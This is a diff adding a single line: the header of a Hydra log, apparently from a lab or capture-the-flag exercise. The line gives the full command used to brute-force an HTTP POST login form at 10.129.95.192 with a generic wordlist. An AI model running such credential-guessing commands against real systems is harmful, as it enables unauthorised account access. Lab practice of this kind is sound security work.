@@ -1,0 +1,1 @@
+# Hydra v9.4 run at 2022-12-09 01:12:45 on 10.129.95.192 http-post-form (hydra -L /usr/share/wordlists/dirb/big.txt -P /usr/share/wordlists/dirb/big.txt -t 10 -w 30 -o hydra-http-post-attack.txt 10.129.95.192 http-post-form /:username=^USER^&password=^PASS^:Wrong Credentials)
